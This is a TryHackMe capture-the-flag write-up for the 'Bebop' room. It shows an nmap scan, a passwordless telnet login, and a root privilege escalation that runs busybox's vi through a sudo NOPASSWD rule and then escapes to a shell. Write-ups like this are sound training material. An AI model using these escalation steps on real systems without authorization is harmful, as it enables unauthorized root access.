# THM: Bebop

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="/images/write_ups/try_hack_me/bebop/bebop.jpeg" alt="Bebop" width="90"/> |
| Room | Bebop |
| URL | https://tryhackme.com/room/bebop |
| Difficulty | Easy |

## Concepts/Tools Used

- telnet

## Room Description

Who thought making a flying shell was a good idea?

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -v -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-22 11:06 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:06
Completed NSE at 11:06, 0.00s elapsed
Initiating NSE at 11:06
Completed NSE at 11:06, 0.00s elapsed
Initiating NSE at 11:06
Completed NSE at 11:06, 0.00s elapsed
Initiating ARP Ping Scan at 11:06
Scanning target.thm (10.10.169.138) [1 port]
Completed ARP Ping Scan at 11:06, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:06
Scanning target.thm (10.10.169.138) [65535 ports]
Discovered open port 23/tcp on 10.10.169.138
Discovered open port 22/tcp on 10.10.169.138
Increasing send delay for 10.10.169.138 from 0 to 5 due to max_successful_tryno increase to 5
SYN Stealth Scan Timing: About 8.82% done; ETC: 11:12 (0:05:21 remaining)
SYN Stealth Scan Timing: About 17.66% done; ETC: 11:12 (0:04:44 remaining)
SYN Stealth Scan Timing: About 26.51% done; ETC: 11:12 (0:04:12 remaining)
SYN Stealth Scan Timing: About 35.34% done; ETC: 11:12 (0:03:41 remaining)
SYN Stealth Scan Timing: About 44.11% done; ETC: 11:12 (0:03:11 remaining)
SYN Stealth Scan Timing: About 52.85% done; ETC: 11:12 (0:02:42 remaining)
SYN Stealth Scan Timing: About 61.40% done; ETC: 11:12 (0:02:13 remaining)
SYN Stealth Scan Timing: About 69.78% done; ETC: 11:12 (0:01:44 remaining)
SYN Stealth Scan Timing: About 78.40% done; ETC: 11:12 (0:01:15 remaining)
SYN Stealth Scan Timing: About 86.77% done; ETC: 11:12 (0:00:46 remaining)
Completed SYN Stealth Scan at 11:12, 346.69s elapsed (65535 total ports)
Initiating Service scan at 11:12
Scanning 2 services on target.thm (10.10.169.138)
Completed Service scan at 11:12, 0.02s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.169.138.
Initiating NSE at 11:12
Completed NSE at 11:12, 7.04s elapsed
Initiating NSE at 11:12
Completed NSE at 11:12, 0.01s elapsed
Initiating NSE at 11:12
Completed NSE at 11:12, 0.00s elapsed
Nmap scan report for target.thm (10.10.169.138)
Host is up (0.00033s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
| ssh-hostkey: 
|   2048 5b:e6:85:66:d8:dd:04:f0:71:7a:81:3c:58:ad:0b:b9 (RSA)
|   256 d5:4e:18:45:ba:d4:75:2d:55:2f:fe:c9:1c:db:ce:cb (ECDSA)
|_  256 96:fc:cc:3e:69:00:79:85:14:2a:e4:5f:0d:35:08:d4 (ED25519)
23/tcp open  telnet  BSD-derived telnetd
MAC Address: 02:45:DA:EE:66:E9 (Unknown)
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

NSE: Script Post-scanning.
Initiating NSE at 11:12
Completed NSE at 11:12, 0.00s elapsed
Initiating NSE at 11:12
Completed NSE at 11:12, 0.00s elapsed
Initiating NSE at 11:12
Completed NSE at 11:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 355.73 seconds
           Raw packets sent: 66080 (2.908MB) | Rcvd: 65537 (2.621MB)
```

I see from the output that telnet is running on the machine. I ran the following to connect to the machine:

```bash
$ telnet target.thm
Trying 10.10.169.138...
Connected to target.thm.
Escape character is '^]'.
login: pilot
Last login: Sat Oct  5 23:48:53 from cpc147224-roth10-2-0-cust456.17-1.cable.virginm.net
FreeBSD 11.2-STABLE (GENERIC) #0 r345837: Thu Apr  4 02:07:22 UTC 2019

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
Man pages are divided into section depending on topic.  There are 9 different
sections numbered from 1 (General Commands) to 9 (Kernel Developer's Manual).
You can get an introduction to each topic by typing

	man <number> intro

In other words, to get the intro to general commands, type

	man 1 intro
```

Just like that, I have a shell on the machine. I look around to see where the user.txt file is:

```bash
$ whoami
pilot
$ ls
user.txt
$ cat user.txt
REDACTED
```

Now that I have the user.txt flag, I need to escalate my privileges to get the root.txt flag. I run my usual [privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation) and `sudo -l` has something interesting:

```bash
$ sudo -l
User pilot may run the following commands on freebsd:
    (root) NOPASSWD: /usr/local/bin/busybox
```

I am not too familiar with busybox. I run the command to see what it does:

```bash
$ /usr/local/bin/busybox 
BusyBox v1.30.1 (2019-08-23 13:25:19 UTC) multi-call binary.
BusyBox is copyrighted by many authors between 1998-2015.
Licensed under GPLv2. See source distribution for detailed
copyright notices.

Usage: busybox [function [arguments]...]
   or: busybox --list
   or: function [arguments]...

	BusyBox is a multi-call binary that combines many common Unix
	utilities into a single executable.  Most people will create a
	link to busybox for each function they wish to use and BusyBox
	will act like whatever it was invoked as.

Currently defined functions:
	addgroup, ar, arch, ash, awk, base64, basename, bc, bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown,
	chroot, cksum, clear, cmp, comm, cp, cpio, crond, crontab, cttyhack, cut, dc, dd, delgroup, diff,
	dirname, dnsd, dos2unix, dpkg, dpkg-deb, du, echo, ed, env, expand, expr, factor, fakeidentd, fallocate,
	false, fatattr, find, flock, fold, fsync, ftpd, ftpget, ftpput, getopt, grep, groups, gunzip, gzip, hd,
	head, hexdump, hexedit, hostid, hostname, httpd, id, inetd, install, iostat, ipcalc, kill, killall,
	killall5, klogd, less, link, ln, logger, logname, logread, lpq, lpr, ls, lzcat, lzma, lzop, makemime,
	man, md5sum, microcom, mkdir, mkfifo, mknod, mktemp, more, mpstat, mv, nc, nice, nl, nmeter, nohup,
	nologin, nslookup, ntpd, nuke, od, paste, patch, pgrep, pidof, ping, ping6, pipe_progress, pkill, pmap,
	popmaildir, poweroff, printenv, printf, ps, pscan, pwd, pwdx, readlink, readprofile, realpath, reboot,
	reformime, renice, reset, resize, resume, rev, rm, rmdir, rpm, rpm2cpio, run-parts, scriptreplay, sed,
	sendmail, seq, setsid, sh, sha1sum, sha256sum, sha3sum, sha512sum, shred, shuf, sleep, smemcap, sort,
	split, ssl_client, stat, strings, stty, su, sulogin, sum, svok, sync, syslogd, tail, tar, tee, telnet,
	telnetd, test, tftp, tftpd, timeout, top, touch, tr, traceroute, traceroute6, true, truncate, tty,
	ttysize, uname, uncompress, unexpand, uniq, unix2dos, unlink, unlzma, unxz, unzip, usleep, uudecode,
	uuencode, vi, volname, watch, wc, wget, which, whoami, xargs, xxd, xz, xzcat, yes, zcat
```

So it looks like busybox is a wrapper for other binaries. I know that I can get a shell using vi and that is one of the binaries mentioned. So I run busybox with sudo and have it run vi so I can get a root shell:

```bash
sudo /usr/local/bin/busybox  vi
```

Inside of vi, I run the following command to generate a shell:

```bash
:!/bash/sh
```

It worked. I'm in! The cursor changed to the # character to let me know that I am root.

Now I grab the flag:

```bash
# whoami
root
# cd /root
# ls
.bash_history  .cshrc  .history  .k5login  .login  .profile  root.txt
# cat root.txt
REDACTED
```
